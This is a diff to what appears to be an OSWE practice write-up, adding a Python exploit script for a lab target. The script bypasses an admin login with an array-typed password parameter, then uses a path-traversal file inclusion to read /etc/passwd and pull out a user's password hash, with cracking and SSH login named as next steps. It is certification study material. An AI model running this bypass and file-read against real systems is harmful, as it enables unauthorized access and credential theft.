@@ -139,3 +139,33 @@ Rooted!
 
 ![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/4ef6b083-18bf-4b57-b1f2-9ebec634be94)
 
+___
+
+Here's the script to extract that initial hash. The rest is a bit out of scope for the OSWE (cracking a hash and logging in via SSH)
+````
+import sys, requests, re
+
+def main():
+	# Login bypass with array as param
+	session = requests.Session()
+	url = server + "/admin/index.php?login=1"
+	data = b"username=admin&password[]="
+
+	r = session.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+
+	# Exploit LFI to fetch /etc/passwd and grep hash. Next step is to crack it and log in via SSH (out of scope for OSWE)
+	url = server + "/admin/dashboard.php?page=log"
+	data = b"file=../../../../../../../etc/passwd"
+	r = session.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+	hash = re.findall(r'webadmin:(.*?):', r.text)[0]
+	print("Found webadmin hash: " + hash)
+
+
+if __name__ == '__main__':
+	try:
+		server = sys.argv[1].strip()
+	except:
+		print("[-] Usage: %s serverIP:port", sys.argv[0])
+		sys.exit()
+	main()
+````
